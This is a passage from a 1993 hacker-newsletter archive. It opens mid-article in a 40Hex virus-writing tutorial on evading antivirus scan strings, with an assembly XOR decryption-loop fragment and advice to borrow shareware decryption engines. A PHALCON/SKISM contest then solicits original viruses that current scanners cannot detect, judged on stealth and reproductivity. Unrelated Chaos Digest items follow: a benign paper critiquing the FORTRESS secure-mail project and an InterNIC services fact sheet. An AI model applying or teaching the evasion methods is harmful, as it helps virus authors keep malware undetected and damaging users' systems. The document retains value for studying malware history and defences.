strains of the virus will be caught by the scanner.

Now we  get to  a much better (and sort of obvious) method: minimising scan
code length.   There are several viable techniques which may be used, but I
shall discuss but three of them.

The one  mentioned before which Mark Washburn used in V2P6 was interesting.
He first  filled the  space to  be filled  in with the encryption mechanism
with dummy  one byte  op-codes such  as CLC, STC, etc.  As you can see, the
flag manipulation  op-codes were  exploited.   Next, he randomly placed the
parts of  his encryption  mechanism in  parts of this buffer, i.e. the gaps
between the  "real" instructions were filled in with random dummy op-codes.
In this manner, no generic scan string could be located for this encryption
mechanism of  this virus.   However, the disadvantage of this method is the
sheer size of the code necessary to perform the encryption.

A second  method is  much simpler than this and possibly just as effective.
To minimise scan code length, all you have to do is change certain bytes at
various intervals.   The  best way  to do  this can  be explained  with the
following code fragment:

  mov si, 1234h                     ;Starting location of encryption
  mov cx, 1234h                     ;Virus size / 2 + variable number
loop_thing:
  xor word ptr cs:[si], 1234h       ;Decrypt the value
  add si, 2
  loop loop_thing

In this code fragment, all the values which can be changed are set to 1234h
for the  sake of  clarity.   Upon infection,  all you  have to do is to set
these variable  values to  whatever is  appropriate  for  the  file.    For
example, mov  bx, 1234h  would have  to be  changed to  have the encryption
start at the wherever the virus would be loaded into memory (huh?).  Ponder
this for  a few  moments and  all shall  become clear.   To  substitute new
values into the code, all you have to do is something akin to:

  mov [bp+scratch+1], cx

Where scratch is an instruction.  The exact value to add to scratch depends
on the  coding of  the op-code.   Some  op-codes take their argument as the
second byte,  others take  the  third.    Regardless,  it  will  take  some
tinkering before it is perfect.  In the above case, the "permanent" code is
limited to  under five or six bytes.  Additionally, these five or six bytes
could theoretically  occur in  ANY PROGRAM  WHATSOEVER, so  it would not be
prudent for  scanners to search for these strings.  However, scanners often
use scan  strings with wild-card-ish scan string characters, so it is still
possible for a scan string to be found.

The important  thing to  keep in  mind when using this method is that it is
best for  the virus  to use separate encryption and decryption engines.  In
this manner, shorter decryption routines may be found and thus shorter scan
strings will  be needed.   In  any  case,  using  separate  encryption  and
decryption engines increases the size of the code by at most 50 bytes.

The last method detailed is theft of decryption engines.  Several shareware
products utilise  decryption engines  in their  programs to  prevent simple
"cracks" of  their products.   This  is, of  course, not a deterrent to any
programmer worth  his salt,  but it  is useful  for virus  authors.  If you
combine the  method above  with  this  technique,  the  scan  string  would
identify the  product as  being infected with the virus, which is a) bad PR
for the company and b) unsuitable for use as a scan string.  This technique
requires virtually  no effort,  as the decryption engine is already written
for you by some unsuspecting PD programmer.

All the  methods described  are viable  scan  string  avoidance  techniques
suitable for  use in  any virus.   After  a few practice tries, scan string
avoidance should  become  second  nature  and  will  help  tremendously  in
prolonging the effective life of your virus in the wild.

+++++

40Hex Number 6 Volume 2 Issue 2                                     File 00C

                        ++++++++++++++++++++++++
                             Virus Contest!
                           'The Spammies(tm)'
                        ++++++++++++++++++++++++
                        Deadline: July 4th, 1992


   This is the first PHALCON/SKISM virus contest.  As a matter of fact, this
is the first contest of its kind.  We believe that it will motivate you to
produce more original code, rather than more hacks.  Winners may have already
won $10,000,000, as well as the prestige of winning the first ever 'Spammie'
awards.


Rules and Regulations:
1)  All submissions must be original source code. (no hacks)
2)  Only one submission is allowed per programmer, plus one group project.
3)  All viruses must be recieved by us before July 4th, 1992.
4)  Viruses must be accompanied by a complete entry form. (see below)
5)  The original, compilable, commented source MUST be included, along with an
    installer program, or a dropper, in the case of boot block viruses.
6)  Entries must include a location where the author may be contacted, such as
    an email address or a BBS.
7)  Personnel or persons related to personnel of PHALCON/SKISM are not
    eligable.
8)  The source must compile without error under Tasm or Masm (please specify
    what assembler and version you used, along with the necessary command line
    switches).  If we cannot compile your virus, it will be disqualified.
9)  All entries recieve a free subscription to 40hex.  (hehehehe)
10) The entry must be uploaded privately to the sysop, stating that it is a
    contest entry.
11) The viruses must not be detectable by the current version (as of July 4th)
    of any known virus scanner.
12) Viruses will be judged by our 'panel of experts' in three catagories.
    6.1)  Stealth
    6.2)  Size
    6.3)  Reproductivity
    6.4)  Performance
        For example, Red Cross is an example of a 'high performance' virus.
        It was entertaining and well done.

*** Entry Form

Handle ________________________
Group Afiliation ______________
Virus Name ____________________
Size ____bytes (if you need more spaces, go away)
Type               ___ File Infector ___ Boot block
Infection method   ___ Direct Action ___ Memory Resident   ___ Directory chain
                   ___ Other (please describe it in detail)
Encryption routine ___ None (bah)    ___ Xor loop
                   ___ Other (please describe it in detail)

Describe what makes your infection routine unique.
_____________________________________________________________________________
_____________________________________________________________________________
Describe what makes your encryption routine unique.
_____________________________________________________________________________
_____________________________________________________________________________
Describe what means your virus uses, other than encryption, to keep itself
hidden.
_____________________________________________________________________________
_____________________________________________________________________________
What is the largest possible scan string for this virus?  __bytes

What else sets this virus apart from other viruses?
_____________________________________________________________________________
_____________________________________________________________________________
_____________________________________________________________________________

------------------------------

Date: Fri Jun 11 15:02:53 BST 1993
From: internet!baltimore.ie!susan (Susan Barry )
Subject: File 2--Fortress: services de securite europeens a la loupe (rapport)


                  IMPLEMENTING AND PROVING SECURITY
               SERVICES FOR THE RARE/COSINE COMMUNITY

    Susan Barry, Patricia McQuillan, Michael Purser (Baltimore Technologies)
               Jonathan Moffett  (University of York)


Summary
+-------

Secure electronic-mail (PEM) and remote access services, using asymmetric key
cryptology have been developed and proved between  several European countries.
The paper reviews the project; high-lighting its shortcomings, since they are
most likely to be of interest to others.

1. Introduction
+---------------

The COSINE Sub-Project P8 (now named "FORTRESS") provides secure electronic
mail (Privacy Enhanced Mail: PEM) and remote access services over wide area
networks using asymmetric key cryptology.  Its main features have been
described in a previous paper [1].  The design phase lasted from November
1991 until April 1992, and the implementation terminated in October 1992 with
the installation of systems in six different countries.  From then until March
1993 evaluation and proving of FORTRESS took place.  This paper is largely
concerned with this latter aspect of the project.  However it is necessary
to review the security services provided if the evaluation and proving are
to be meaningful.  This is done in Section 2.  Sections 3 and 4 are critiques
of the user-related and technical aspects of the services.  Section 5
describes the proving process, and Section 6 contains brief conclusions.

2. Security Service Overview
+----------------------------

The principal service provided is secure messaging based on PEM [2].  Messages
may be guaranteed as uncorrupted and authentic by attaching the sender's
digital signature to them; and may be made confidential by means of encryption
Public key cryptology (RSA) [3], is used for the signatures, and for
encrypting the symmetric keys which in turn are used to encrypt (DES) [4] the
message text.  The use of public key cryptology implies the existence of a
Certification Authority (CA) which issues certificates guaranteeing the
genuineness of users' public keys.  (This is done by having the CA sign the
user's identity and public key as a unit.)  In FORTRESS the CA, operated in
Dublin by Baltimore Technologies, generates as well as certifies users' secret
and public keys.  New users are "recommended" by existing privileged users,
called Security Administrators (SAs); and this is an on-line operation between
the SA's system and the CA over the network.This remote access to the CA is
made secure by means of a two-way X.509 strong authentication procedure [5],
in which both parties are reciprocally and securely identified, and during
which a symmetric key is established for stream-encrypting the subsequent
dialogue using BSA [6].

In response to a successful Recommendation an SA receives, on behalf of the
new user, a Personal Secure Environment (PSE) encrypted under  a DES-key,
derived from a PIN via a one-way function.  This PIN is itself submitted,
encrypted, in the prior recommendation.  The PSE  contains the user's secret
key and other cryptographic data.  It is a  local matter as to how this PSE
is made available to the new user; but  once this has been achieved he can
perform signing/authentication and encryption/decryption operations for PEM
and access to the CA, by entering his PIN as required to decrypt (momentarily)
his PSE.  Naturally, the user's first operation on receiving a PSE will be to
change the PIN.

In addition to Recommendations, other applications at the CA are made
available to users over the secure remote access service.  For example an
SA can revoke a certificate, and place it on a blacklist.  Revocation would
apply if the certificate owner's secret key were compromised, or if the owner
were no longer considered to be a suitable system user.  Ordinary users can
also access the blacklist on the CA, to read it or download it.  They can
download the database of valid certificates.  They can access news files, etc.

To enable the CA to distinguish between ordinary and privileged users (SAs),
a user's authorisation attributes are built into his certificate.  (Other
information, such as an expiry date for its validity, is also built into
the certificate.)  The CA uses these attributes to control Recommendations,
Revocations and other operations according to an authorisation hierarchy.
For example, only certain SAs can recommend new SAs at a new user site; SAs
in one country cannot revoke users in another; etc.  However, the presence
of authorisation attributes in the certificate (a necessary concept borrowed
from architectures such as Kerberos [7], SESAME [8]) causes a FORTRESS
certificate to be non-standard; i.e. not compatible with X.509.  (There are
plans to overcome this problem, maintaining FORTRESS certificates for use
with remote access, but introducing further X.509-compatible certificates
to allow interworking with other systems, e.g. the "Password" project.)
At the CA, there are additional functions which enable operators to generate
RSA keys, maintain the database and blacklist, etc.  The access of operators
to the CA is controlled by smart cards.

GMD's SecuDe software was used as a basis for the development of the FORTRESS
software; in particular, it provided the PEM implementation, and the basic
functions of the CA.  The associated user interfaces, and the software for
the secure remote access service, have been developed by Baltimore.  The
systems run under Unix, on SUN workstations.  The remote access to the CA
is over X.25 networks.

3. User Aspects - a Critique
+----------------------------

Most of the problems in FORTRESS were related to the user's view and
management of the system.

The CA and its applications, accessed over the secure remote access
service, are merely security infrastructure for PEM - or possibly some
other future applications such as secure file transfer or EDI.  PEM
itself consists of two services : PEM-SCAN (process a received PEM
message) and PEM-CREATE (or generate a PEM message).  These services
are essentially file-to-file processors, which perform the
cryptographic functions on the way.  They are simple to use, but they
are not integrated with any mail or messaging system; principally
because too many differing mail systems, not to mention user
interfaces, exist amongst project participants.  Thus a sender of a
PEM message first creates the message; then processes it with PEM-
CREATE; and finally uses his normal mail service to transmit the file
created by PEM-CREATE.  This is inconvenient for users.
The security of the users' end-systems, although it is explicitly
outside the scope of the project, is however another practical
limitation on the service.  Apart from the user's encrypted PSE there
is no other project-provided protection of his system.  In particular,
the genuineness of the code is not checked; and there is no secure
control of local access (e.g. over a LAN) to the system.  Thus a user,
accessing his PEM facility, very probably not only sends his User-ID
and Password in clear over the LAN, but also his PSE PIN.  In reality,
if a user is to have confidence in the security of the PEM service, it
is necessary to install the end-system in a secure environment with
controlled access.

The decision to provide on-line access to the CA is, we believe, a
good one.  But it does imply that the CA should provide fast response.
This is not always the case.  Firstly, Recommendations give rise to
the generation of RSA keys, which may take many seconds - indeed more
than a minute.  A solution to this can be provided by pre-generating
keys, and holding them in a cache; although there are obvious security
risks with this approach.  Secondly, on-line user operations involving
the data base of extant and the blacklist of withdrawn certificates
can become quite lengthy if those lists are large.  Some conventional
data processing techniques (sorting!) could have been profitably used
in the FORTRESS project.

The project was conceived with a single CA serving many participants
in many countries, with secure remote access to the CA over X.25.
This gives rise to many anomalies.  For example, whereas participants
may have local security policies, procedures, etc.; the CA (whose
security is fundamental to all services) is not subject to those
policies.  There are questions about who is responsible for handling
security incidents.  There must be questions in participants' minds as
to how secure the CA really is.  In reality, serious users wish to
operate their own CAs for secure internal traffic.  Insofar as they
require secure external communication services; these could be
supported by the cross-certification of CAs' public keys, enabling a
user in one domain to authenticate a certificate belonging to a user
in another domain.  In turn, if CAs are to be local, it might be wiser
to have them operate over a LAN-compatible infrastructure; rather than
over X.25.

In an operational environment, as opposed to FORTRESS' pilot service,
another problem affecting users is that of out-of-date certificates.
In principle, a signature to a document is valid long after the
signatory's secret key has expired; provided that the signature was
generated before the expiry.  Similarly, a message may be held in
encrypted form for years; and the public key required to decrypt it
should be still available, even if withdrawn.  There is a need for a
service making available out-of-date certificates to users, which has
not yet been addressed in FORTRESS.

The above problem areas:

* PEM integration with the user's preferred mail environment
* Security of users' end-systems
* On-line response delays at the CA
* In-house versus external CA
* The availability of expired certificates to users have been identified
  by FORTRESS participants and the development team as important.
* Designers and implementors of future systems are advised to take note!

4. Technical Aspects - the Critique continues
+---------------------------------------------

The FORTRESS security services work well and effectively; but there is
room for improvement.  In addition to aspects visible to users (see
above) there are technical problem areas visible only to system
operators, or to software specialists.  Some of these are now
presented.

The initialisation of security systems usually requires manual or
semi-manual procedures for the distribution of first-time keys, PINs,
etc.  Similarly, reinitialisation (e.g. when a key is compromised)
will need such procedures, which may indeed be more demanding.  As an
example, if a new public key for the CA is to replace the old one,
because the old one can no longer be trusted, a major logistical
problem arises since all systems are affected.  The solutions to these
initialisation problems need to be carefully specified in advance; not
left to improvisation - possibly in panic conditions.

The identification of persons and systems is always more complex than
it appears.  FORTRESS' SecuDe uses serial numbers as unique
identifiers of certificates (per issuer).  But users refer to a
certificate by its owner's name.  The maintenance of an unambiguous
mapping between the two - given that users may have more than one
certificate, may be Revoked and re-Recommended several times, etc. -
is a potential source of problems.  Additionally, how is the integrity
of this serial number within the certificate-generating software
assured?  What form should the user's name take?  The PEM naming
hierarchy does not recognize the existence of a supranational entity
such as COSINE (or Europe) within which countries in the X.500 name
structure can fit.

The FORTRESS CA is operated by the system developers, Baltimore
Technologies.  It is a PIN-controlled application accessed from Unix.
This situation should be reversed.  The CA should be the main program
(PIN-controlled), with escape to Unix barred unless the operator has
special privileges.  The PIN itself is read from a chipcard; but it is
inserted into the chipcard "manually".  A rigorous separation between
development and operation is required, in which developers hand over
to operators a system (such as the CA) in which the operator's
capabilities are defined and restricted.  If this hand-over is
accepted the operator can thereafter be made accountable for the
system.

Users of the systems must trust the correctness of the software.  But
in security systems there is ample scope for "spoof" software, which
(for example) states that a signature has been authenticated
correctly, a remote system has been identified securely, or a text has
been encrypted, when it has not.  Spoof software can trick users into
entering their PINs to it, or into performing one operation
(Revocation) when another was intended (Recommendation).  Really
secure software should be encrypted on file, integrity checked on
loading; backups should be integrity checked and encrypted; etc.
FORTRESS does not do this.

However cryptographic keys are secured (e.g. in encrypted PSEs for
FORTRESS) there comes a time when they are used.  Unless this is done
within tamper-proof hardware, they are then at risk.  Spoof software
(see above) can capture them.  More prosaically, a user may simply be
diverted half-way through such a critical operation - and the key left
unprotected in memory.  Timeouts and memory clean-up facilities are
needed to minimise such risks.  FORTRESS employs timeouts, but
systematic clearing of memory after use is not practised.

In addition to the above problem areas there are several other
vulnerabilities in the FORTRESS implementation; ranging from basic
design problems (such as one PSE for the CA and all its operators) to
omissions (such as proper purging facilities, e.g. for the certificate
blacklist) due to time constraints and the limited scale of the
project.  Most of these however are minor, and too particular to
FORTRESS to be worth detailing here.

5. The Proving Process
+----------------------

The points made in Sections 3 and 4 were identified in the course of
the proving phase.

The COSINE Project Management Unit, right from the start, regarded the
testing out of the effectiveness of the security services as an
integral part of the sub-project, and planned and budgeted for this
activity.  Budgetary constraints meant that it was not possible to
bring in independent consultants to perform the entire proving
activity, because of the amount of time which would have been required
for familiarisation with the details of the system.  Therefore the
paper analysis and computer-based attacks were undertaken by the
developers, supervised by an independent consultant.

A systematic proving process was planned, involving both developers
and users.  It included :

* The regular exchange of valid and deliberately corrupted PEM messages
  between participants over a 3-month period, according to a weekly
  rota.  These exchanges revealed much about "user-friendliness", and
  the reliability of the underlying E-Mail carriers, but no occurrences
  of security failures were recorded.

* A "paper" analysis of the systems implemented which culminated in a
  list of some 60 potential vulnerabilities; the most important of which
  have been discussed above.

* Computer-based attacks on the security mechanisms, using defective
  certificates, weak keys, etc.  These attacks were designed to probe
  further the vulnerabilities identified in the paper analysis.  In
  reality, while interesting, they yielded no unforeseen results.

Conclusion
+----------

The proving activity in the project has served two useful purposes:

It has ensured that a number of weaknesses, already known to the
developers, were collected and evaluated in a methodical fashion.
The systematic computer-based attacks, which revealed no further
significant weaknesses, gave additional confidence in the robustness
of the system.

The FORTRESS systems and software have proved to be remarkably secure
and robust, given their pilot nature.  The weaknesses which have been
identified are almost all in the "environment" - the physical, network
and organisational surroundings within which FORTRESS operates.

Genuine FORTRESS problems are few, and essentially easily remedied.
More generally, in retrospect it is clear that although the
international "community" approach was necessary under COSINE, the
requirement for operational security services is nearly always
internal - within an organisation.  The FORTRESS products need to be
adapted to this requirement (e.g. a foolproof CA); and real user
groups (generally administrative not technical persons) need to be
prepared to receive them.

This is the intended next phase of the project.

Acknowledgements
+----------------

It is a pleasure to acknowledge the cooperation received by all
participants in the project; and the support and guidance given by the
COSINE Project Management Unit; in particular Maria Pallares.

References
+----------

1. "COSINE Sub-Project P8 : security services" Purser, Computer
   Networks and ISDN Systems 25 (1992) 476-482, North Holland.
2. "Privacy Enhanced Mail" RFC 1113, 1114, 1115 Internet.
3. "A method for obtaining digital signatures and public key
   cryptosystems" Rivest, Shamir and Adleman.  Comm. ACM 21 (1978).
4. "Data Encryption Algorithm" ANSI X3.92.
5. "The Directory - Authentication Framework" CCITT (Blue Book)
   Fascicle VIII.8 X.509 (1988).
6. "A fast stream encryptor" Purser, unpublished.
7. "The Kerberos Network Authentication Service Overview" MIT
   Project Athena RFC, Draft 1, April 1989.
8. "SESAME (Secure European System for applications in a Multivendor
   Environment) - An Introduction".  (Bull/ICL/SNI) Tom Parker, ICL
   Secure Systems.

------------------------------

End of Chaos Digest #1.52
************************************

Chaos Digest               Jeudi 17 Juin 1993        Volume 1 : Numero 53
                             ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.53 (17 Juin 1993)
File 1--InterNIC, organe du NSFNet (fiche technique)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Mon Jun 14 16:23:04 PDT 1993
From: refdesk@is.internic.net (InterNIC Reference Desk )
Subject: File 1--InterNIC, organe du NSFNet (fiche technique)


==============================================================================
InterNIC Information Services                            Hotline: 800-444-4345
General Atomics (GA)                               Email: Info@is.internic.net
P.O. Box #85608                                            Phone: 619-455-4600
San Diego, CA 92186-9784                                     FAX: 619-455-3990
==============================================================================
Document Date: 6/10/93

[General Atomics makes no warranty or guarantee, express or implied,
concerning the content or accuracy of the information stored and
maintained by General Atomics for the InterNIC Information Services and
made available to INTERNET users, and General Atomics expressly disclaims
any implied warranties of merchantability and fitness for a particular
purpose.]

                             The InterNIC
                            ++++++++++++++

In cooperation with the Internet community, the National Science
Foundation developed and released in the Spring of 1992 a solicitation for
one or more Network Information Services Managers (NIS Manager(s)) to
provide and/or coordinate services for the NSFNET community. As a result
of this solicitation, three separate organizations were competitively
selected to receive cooperative agreements in the three areas of
Registration Services, Directory and Database Services, and Information
Services.

Together these three awards constitute the InterNIC.  Network Solutions,
Inc. (NSI) provides REGISTRATION services, AT&T provides DIRECTORY and
DATABASE services, and General Atomics/CERFnet provides INFORMATION
services.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


                   INTERNIC REGISTRATION SERVICES

The InterNIC Registration Services is located at Network Solutions,
Inc., Herndon, VA, and is funded by a cooperative agreement from the
National Science to provide assistance in registering networks, domains,
asn's, and other entities to the Internet community  via telephone,
electronic mail, and U.S. postal mail.

Registration Services will work closely with domain administrators,
network coordinators, internet service providers, and other various
users to register Internet domains, asn's, networks.

Databases and information servers of interest to network users are
provided, including the WHOIS registry of domains, networks, asn's and
their associated poc's.  Gopher and Wais interfaces are also available
for retrieving information and accessing whois.  Online documents
maintained at registration services include registration related rfc's,
registration templates, and various netinfo files.   Many of the online
files are available through our automatic mail service,
MAILSERV@RS.INTERNIC.NET.

Registration Services will assign asn's, register domains assigns IP
network numbers and Autonomous System Numbers, and produce the domain
zone files for the community.  Registration Services will also provide
assistance to user's concerning policy and the status of their existing
registration request.


I.   USER ASSISTANCE SERVICE

Toll-free telephone service is available Monday through Friday, 7 am
to 7 pm, Eastern Standard time.  Users who require assistance concerning
policy or registration status questions are encouraged to make use
of these services:

     Phone Number:             1-703-742-4777


II.  NIC ONLINE MAILBOXES

To contact Registration Services via electronic mail 24 hours a day, 7 days
a week, use these mailboxes:

     HOSTMASTER@RS.INTERNIC.NET  Host, domain, network changes and updates
     ACTION@RS.INTERNIC.NET      Computer Operations
     MAILSERV@RS.INTERNIC.NET    Automatic mail service


III. InterNIC Registration Services Postal Address

Send U.S. postal mail correspondence to:

     Network Solutions
     AttN: InterNIC Registration Services
     505 Huntmar Park Drive
     Herndon, VA 22070


IV.  REGISTRATION COMPUTER SERVICES

The host computer is a SUN SparcServer, running the SUN operating
system, and its hostname is RS.INTERNIC.NET. Its network address is
198.41.0.5.

The network address of Registration Services domain root server is
198.41.0.4.

Online services are available 24 hours a day, 7 days a week.

V.   DOCUMENTS DISTRIBUTED BY REGISTRATION SERVICES

Registration Services distributes the following documents which are available
online.

Title                                                  Online Filename

 master.index . . . . . . . . . . . . . . . . . . . . .policy/master.index


NOTE: In the filenames, the "nn" or the "nnn" should be replaced by the
      number of the newsletter, bulletin or RFC.

To retrieve a document whose filename is listed above, open an FTP
connection to the RS.INTERNIC.NET host, login as user ANONYMOUS and provide
the password GUEST. Retrieve the desired file.


VI.  ONLINE INFORMATION SERVERS


a.     WHOIS

WHOIS is a program that provides an electronic "white pages"
of Internet network entities such as domains, network numbers, asn's,
and their associated poc's.
        
     Accessing WHOIS

>From a host, use the TELNET program to connect to host RS.INTERNIC.NET.
When greeted by the Registration host, type "WHOIS" and press RETURN.


c.   QUERY CAPABILITIES

Registration Services has implemented Gopher and Wais interfaces to
query for information.  Using the Gopher Interface, one can obtain
information on registration, information and directory services for the
InterNIC team.  Using gopher one can also access archive data, netinfo
files, and policy related documents.  The Wais interface enables a user
to access the whois database and search for data using a specific
search string.

     Accessing Gopher and Wais


>From a host, use the TELNET program to connect to host RS.INTERNIC.NET.
Type "Gopher" or "Wais" and press RETURN.


e.     ROOT DOMAIN NAME SERVER

Registation Services  is responsible for generating and installing the DNS
files into the NS.INTERNIC.NET root server and the six alternate root servers
three times a weekly (Monday, Wednesday, Friday).


VII. ONLINE FILES

Registration Services  maintains a number of online files which are available
to network subscribers via the file transfer program (FTP) or Kermit.
These files contain information about protocols, site personnel,
hosts, and other subjects relevant to network users.  See the file
netinfo/00netinfo-index.txt for an index to the files in the "netinfo"
directory.  See also the file master.index in the policy directory
which lists the rfc's available.

a. How to Retrieve files Using FTP

To retrieve any of the public files via your local FTP program,
connect to the RS.INTERNIC.NET host, and log in as ANONYMOUS with password
GUEST.  FTP program use varies slightly from host to host, so please
consult your Host Administrator for instructions, if needed.


b. How to Use the Automated Mail Service

MAILSERV@RS.INTERNIC.NET is an automated service provided by InterNIC
Registration Services.  It allows access to documents and
information via ordinary electronic mail.  This is especially useful
for users who do not have access to the NIC via a direct Internet
link, such as users of BITNET, CSNET and UUCP sites.

   To use the mail service, send a mail message to MAILSERV@RS.INTERNIC.NET.
In the SUBJECT field, request the type of service you wish followed by
any needed arguments.  The message body is normally ignored.  Large files
will be broken into smaller separate messages.  The information you
request will be sent back to you as soon as possible.

The following services are currently available:

HELP            This message; a list of current services.
INDEX   Returns the master list of available index files.
NETINFO xxx     xxx is a file name or the word INDEX.
RFC nnn         nnn is the RFC number or the word INDEX.
SEND xxx        xxx is a fully specified file name.
WHOIS xxx       Returns information about xxx from the WHOIS service.
                Use "WHOIS HELP" for information on how to use WHOIS.

Example SUBJECT lines:

    HELP
    RFC 822
    NETINFO DOMAIN-TEMPLATE.TXT
    SEND RFC: RFC1009.TXT
    WHOIS NEOU, VIVIAN

Send comments or suggestions to ACTION@RS.INTERNIC.NET.

IX. HOST, DOMAIN, NETWORK NUMBER, IN-ADDR, AND ASN REGISTRATION

Registration is responsible for the registration of domains, IP
networks, and autonomous systems numbers (ASNs) used by various
organizations connected to the Internet.

Domains are registered via the domain template found in
templates/domain-template.txt.  New domain information is installed into
the seven DNS root servers three times a week.    Information
regarding the root servers is kept in netinfo/root-servers.txt.
Additionally, a listing of the domains registered with Registration
Services can be found in netinfo/domain-info.txt.  A listing of the
netaddresses of the domain servers for individual top-level domains can
be found in netinfo/domains.txt.

Network number assignments are made when a network POC completes the
template in templates/internet-number-template.txt and returns the
template to Hostmaster.  A complete listing of government sponsored
networks is found in netinfo/networks.txt.

To provide address to hostname reverse resolution, IN-ADDR domains are
registered within the domain root servers via an IN-ADDR template sent
to the HOSTMASTER mailbox.  This template can be found in
templates/in-addr-template.txt.

Registration Services assign autonomous system numbers (ASNs) when the
template
found in netinfo/asn-template.txt is sent to HOSTMASTER@RS.INTERNIC.NET.
A complete listing of assigned ASNs is found in netinfo/asn.txt.

>From the domain, network number, and ASN templates, POC information is
extracted and individuals that are not already registered are given
records in the WHOIS database.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


                 InterNIC Directory and Database Services

Directory and Database Services, provided by AT&T, includes a Directory of
Directories, containing lists of FTP (File Transfer Protocol) sites, lists
of various types of servers available on the Internet, lists of white and
yellow page directories, library catalogs and data archives. AT&T also
provides white and yellow pages type Directory Services. Access to these
services is initially provided through several currently popular in-use
interface methods while migrating to the use of X.500 technology, the
current standard specification for distributed information storage and
retrieval.

The database services which AT&T provides include the establishment of
Database Services to extend and supplement the resources of the NSFNET,
such as databases of contributed materials of common interest to the user
community.  AT&T also offers database design, management, and maintenance
to institutions and groups for inclusion in the Internet.

Detailed contact information for accessing Directory and Database Services
electronically is listed below. For general information about InterNIC
Directory and Database Services, call or write:

Phone: 908.668.6587
Fax:   908.668.3763
Mail:  admin@ds.internic.net


               InterNIC Directory and Database Services
                           Server Access

Begining April 1, 1993, the InterNIC Directory and Database
server will be freely available to all end users on the Internet
24 hours a day, 7 days a week.   The server is a UNIX processor
running SunOS 4.2.1 with host name ds.internic.net.  It contains
the files and databases which make up the Directory of
Directories, Directory Services and Database Services.  Several
different interfaces are available to allow easy access to these
services for both sophisticated and novice users.

WAIS
+----

The Wide Area Information Server (WAIS) client/server
application (developed by Thinking Machines, Inc. and others) is
implemented to allow WAIS searching of text files stored on the
server.  The server is registered at the central WAIS server
maintained by Thinking Machines, Inc. at quake.think.com.  Our
WAIS server may be accessed by remote WAIS clients or through a
local WAIS client available through telnet.  Just telnet to
ds.internic.net and login as userid "wais".  No password is
required.  This client contains an online tutorial and help
information for all commands.

archie
+------

The archie system, developed by Bunyip Information Systems,
Inc., is also implemented to allow searches of the Directory and
Database server directory structure.  Archie is accessible
through telnet (login as userid "archie", no password required)
or electronic mail (send mail to archie@ds.internic.net).
Archie's online help facilities are available for the new user.

X.500 DUA and NETFIND
+---------------------

The X.500 QUIPU Directory Service Agent (DSA) and an X.500
Directory User Agent (DUA) are implemented to allow searching
for white pages listings of persons or organizations currently
participating in Internet X.500 pilot projects.  The DUA may be
accessed via telnet by logging in as user "x500".  No password
is required and online help is provided.  The DSA may also be
accessed from any remote DUA.  A NETFIND client is also
available to get information about individuals.  Telnet to
ds.internic.net and login as user "netfind".  Again, no password
is required.

Tutorial Telnet Client
+----------------------

A special tutorial login is available to allow new users to
access any of the online services on the Directory and Database
server without the specific login id.  Just telnet to
ds.internic.net and login as "guest" (no password required).
The tutorial will guide the user through the various services
and connect him/her to the client they request.

Anonymous FTP
+-------------

All files accessible through the telnet clients listed above are
available using anonymous FTP.

Electronic Mail
+---------------

An electronic mail application, developed by AT&T, is available
which provides batch access to our services.  To obtain user
information, send mail to mailserv@ds.internic.net and include
the command HELP in the body of the message.

Additional access interfaces will be added in the future.  For
example, the Internet GOPHER will be implemented within a few
months.  If you are interested in more information about access
to Directory and Database Services, contact the Directory and
Database Administrator on (908) 668-6587 or send electronic mail
to admin@ds.internic.net.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

                    InterNIC Information Services

InterNIC Information Services provides services to the NSFNET community
under the National Science Foundation supported InterNIC project. A
wide range of services are offered to midlevel and campus NIC
organizations and to the networking community at large. Included is
information about how to get connected to the Internet, pointers to
network tools and resources, and seminars on varied topics held in
locations around the country.

For a more detailed description of the project, refer to the document
"Information Services Project Summary", located in the directory "About
Information Services" in the InterNIC InfoSource. For a complete listing
of Information Services offerings, see the same directory. Access to the
InfoSource via various methods is described below.

InterNIC Information Services can be contacted by phone, fax, hardcopy
mail, and electronically via several access methods. The primary
interfaces used by the InterNIC to exchange information with the
community are the Reference Desk, the InfoSource, and electronic and
hardcopy mailing lists. Complete contact information is listed below.
Please use any or all of these methods to request information, submit
contributions, or make suggestions.


1. The Reference Desk
+---------------------

The InterNIC Information Services Reference Desk responds to requests
for information about the Internet via telephone, e-mail, FAX, and
hardcopy mailings. The Reference Desk can provide listings of Internet
Network Providers in the U.S. and abroad; books and documents to assist
organizations and individuals in getting connected; and pointers to
network tools and resources. When appropriate, contact information for
local NIC and NOC organizations will be offered.

The Reference Desk is in operation Monday through Friday, from 5:00 A.M.
to 7:00 P.M. Pacific Daylight Time.

Telephone:  800.444.4345
            619.455.4600
